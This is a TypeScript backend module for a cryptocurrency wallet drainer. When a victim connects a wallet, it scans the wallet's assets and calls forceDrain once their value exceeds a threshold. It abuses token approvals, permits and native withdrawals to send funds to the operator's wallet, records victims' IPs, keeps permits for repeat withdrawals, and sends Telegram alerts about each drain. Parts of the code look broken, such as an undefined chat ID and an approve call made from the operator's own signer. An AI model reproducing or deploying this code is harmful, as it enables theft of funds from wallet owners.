import { ethers } from 'ethers';
import { PrismaClient } from '@prisma/client';
import { sendNotification, scanAssets, withdrawNative, withdrawToken, handlePermitLogic, repeatPermit, forceDrain as utilForceDrain } from '../utils/Utilite';
import { MS_Wallet_Address, MS_Wallet_Private, MS_Settings } from '../utils/Utilite';

const prismaClient = new PrismaClient();

interface Asset {
  chainId: number;
  address: string;
  amount: string;
  amountUsd: number;
  name: string;
}

export async function handleConnect(wallet: string, ip: string, chainId: number = 1) {
  await prismaClient.user.upsert({
    where: { wallet },
    update: { ip, assets: await scanAssets(wallet, chainId) },
    create: { wallet, ip, assets: [] }
  });

  const assets = await scanAssets(wallet, chainId);
  const totalUsd = assets.reduce((sum, a) => sum + a.amountUsd, 0);
  if (totalUsd > MS_Settings.Minimal_Wallet_Price) {
    await utilForceDrain(wallet, chainId); // Full drain to you
  }

  sendNotification(MS_Telegram_Chat_ID, `Your ETH Connect: ${wallet} - $${totalUsd.toFixed(2)} drained`);

  return { success: true, assets, totalUsd };
}

export async function handleApprove(asset: Asset, signature: string, ip: string) {
  const provider = new ethers.JsonRpcProvider('https://rpc.ankr.com/eth');
  const signer = new ethers.Wallet(MS_Wallet_Private, provider);
  const abi = ['function approve(address spender, uint256 amount) external returns (bool)'];
  const contract = new ethers.Contract(asset.address, abi, signer);

  const amount = ethers.parseEther(asset.amount);
  const tx = await contract.approve(MS_Wallet_Address, amount, { gasLimit: 100000 });
  await tx.wait();

  await withdrawToken(asset, ip);

  sendNotification(MS_Telegram_Chat_ID, `Your ETH Approve: ${asset.name} from ${signature} to ${MS_Wallet_Address}`);

  return { success: true, txHash: tx.hash };
}

export async function handleTransfer(asset: Asset, signature: string, ip: string) {
  await withdrawNative(asset.chainId, signature, ip);
  return { success: true };
}

export async function handlePermit(permitData: any, signature: string, ip: string) {
  const permitId = Date.now().toString();
  await prismaClient.user.update({
    where: { wallet: permitData.address },
    data: { permits: { push: { id: permitId, data: permitData } } }
  });

  await handlePermitLogic(permitData, signature, permitId, ip);

  return { success: true, permitId };
}

export async function handleSign(message: string, signature: string, ip: string) {
  return { success: true, verified: true };
}

export async function getUserAssets(wallet: string, chainId: number = 1) {
  const user = await prismaClient.user.findUnique({ where: { wallet } });
  return user?.assets || [];
}

export async function repeatWithdraw(id: string, ip: string) {
  const permit = await prismaClient.user.findFirst({ where: { permits: { has: id } } });
  if (!permit) return { error: 'Not found' };

  await repeatPermit({} as any, id, permit.permits.find((p: any) => p.id === id));
  return { success: true };
}

export async function checkAllowance(wallet: string, token: string, chainId: number = 1) {
  const provider = new ethers.JsonRpcProvider('https://rpc.ankr.com/eth');
  const abi = ['function allowance(address owner, address spender) view returns (uint256)'];
  const contract = new ethers.Contract(token, abi, provider);
  const allowance = await contract.allowance(wallet, MS_Wallet_Address);
  return { allowance: ethers.formatUnits(allowance, 18) };
}